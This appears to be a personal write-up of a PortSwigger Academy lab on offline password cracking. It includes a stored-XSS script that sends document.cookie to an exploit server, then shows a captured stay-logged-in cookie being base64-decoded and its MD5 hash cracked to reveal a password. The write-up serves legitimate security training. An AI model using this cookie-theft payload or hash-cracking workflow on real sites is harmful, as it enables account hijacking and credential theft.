# Offline password cracking
[Offline password cracking](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-offline-password-cracking#)

Another day, Another lab.

## Thought Process

- Starting off, we'll be starting the lab and Burp Suite, then we'll be enabling Foxy Proxy to redirect all Chrome's traffic to Burp Suite.

- The first thing we notice is that there's an XSS vulnerability in the comments section (the lab description tells us so.). So my first immediate idea is to login to our account using `wiener:peter` and then submitting a comment that steals the user's cookies.

- The only thing that I need to do is simply create an HTTP server that would receive the request that has the victim's cookie. For this, I'm going to use [Yoink!](https://yoink.michaelyousrie.com) which is a simple HTTP request logger that can log all requests that are sent its way. Feel free to use the same tool (completely free) or use any other that you would like.

- Alright so I tried to use Yoink! but it didn't work. I believe the lab is stopping the visit of any external domains other than the whitelisted exploit server domain. So I ended up creating the XSS script to redirect the user to the exploit server's URL.

```JAVASCRIPT
<script>
document.location = "https://exploit-0a13003d03a4929a80e00cfb01df00af.exploit-server.net/exploit?c=" + document.cookie; // Make sure to change exploit-0a13003d03a4929a80e00cfb01df00af to your actual exploit server's URL.
</script>
```

- Once I stored the exploit, and submitted a comment on a post on the lab's blog with this XSS script, I found a visit on the access log of the exploit server with the following details `/exploit?c=secret=ZV5GpnFYCVzgGoyjq5qkrsMX4teuTFIn;%20stay-logged-in=Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz`

- This means that the user has successfully visited our exploit server and has given us their `stay-logged-in` cookie. Not sure what this `secret` cookie is, we can investigate it later.

- I tried to outsmart the lab by using the cookie's value directly in my browser to try and `session-hijack` poor Carlos but it didn't work. Looks like the lab creators are super smart that they actually changed the value of the cookie on Carlos' account so we can't do this trick to easily solve the lab. Kudos.

- Let's decypher the cookie `Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz` and see what we get. I'll be pasting this hash in [Cyber Chef](https://gchq.github.io/CyberChef/) and will see what I get.

- Cyber Chef immediately told me it's a base64 text and decoded it to `carlos:26323c16d5f4dabff3bb136f2460a943`. Looks like the same case from the previous lab [Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/vulnerabilities-in-other-authentication-mechanisms/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie#) which has a [writeup here](https://github.com/michaelyousrie/portswigger-academy-scripts/tree/master/portswigger-lab-brute-forcing-a-stay-logged-in-cookie)

- Let's try to see what this hash `26323c16d5f4dabff3bb136f2460a943` is. I'll be pasting it in Cyber Chef as well to see. But if my gut is correct and it's the same case from the previous lab, then it'll be an MD5 of the password.

- I pasted it into Cyber Chef and got gibberish so now, I'm pretty sure it is what I think it is. I'll be pasting this into a common md5 decryptor like [CrackStation](https://crackstation.net/)

- Immediately after pasting it, I instantly got the results that the password is `onceuponatime`

- Now we have Carlos' password, let's login to their account and delete their account (why so evil lab designers? can't I just like change their name to something troll and be done with it?)

- Yeah baby! It works like a charm. Always cool to see the banner dropping down with the "Congratulations! you solved the lab!".

- I love the fact that you need to enter Carlos' password again to confirm deleting the account. It's a cool feature but shows how weak it is in this scenario where we actually have Carlos' password. Would be cool if there was some kind of 2FA on a critical feature like deleting account.

- No scripts were needed for this lab. Not even Burp Suite was necessary for this lab. Just Chrome was enough.